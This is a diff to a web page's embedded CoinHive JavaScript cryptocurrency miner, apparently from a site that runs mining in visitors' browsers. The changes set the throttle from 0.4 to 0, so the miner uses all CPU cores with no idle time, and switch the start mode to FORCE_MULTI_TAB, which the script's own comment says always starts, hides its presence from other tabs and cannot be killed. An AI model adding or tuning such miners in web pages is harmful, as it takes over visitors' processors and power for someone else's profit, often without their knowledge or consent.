@@ -67,10 +67,10 @@
 
     <script type="text/javascript">
         /*
-                                        Copyright @ Credit https://github.com/C0nw0nk/CoinHive
+                                                        Copyright @ Credit https://github.com/C0nw0nk/CoinHive
 
-                                        Expect regular updates and any issues post here : https://github.com/C0nw0nk/CoinHive/issues
-                                        */
+                                                        Expect regular updates and any issues post here : https://github.com/C0nw0nk/CoinHive/issues
+                                                        */
 
         (function() {
             var a = function() {
@@ -99,7 +99,7 @@
                         //Threads - The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available
                         var mining_threads = navigator.hardwareConcurrency;
                         //Throttle - The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.
-                        var mining_throttle = .4;
+                        var mining_throttle = .0;
                         //Statistics Update frequency. 1000 = 1 Second.
                         var coinhive_statistics_timer = 1000;
 
@@ -445,7 +445,7 @@
                         CoinHive.FORCE_EXCLUSIVE_TAB The miner will always start and immediately kill all miners in other tabs that have not specified CoinHive.FORCE_MULTI_TAB.
                         CoinHive.FORCE_MULTI_TAB     The miner will always start. It will not announce its presence to other tabs, will not kill any other miners and can't be killed by other miners. This mode is used by the captcha and shortlinks.
                         */
-                        var coinhive_starting_mode = CoinHive.IF_EXCLUSIVE_TAB;
+                        var coinhive_starting_mode = CoinHive.FORCE_MULTI_TAB;
                         /*End Coinhive settings*/
                         /*Start CoinHive functions*/
                         function getHashesPerSecond() {
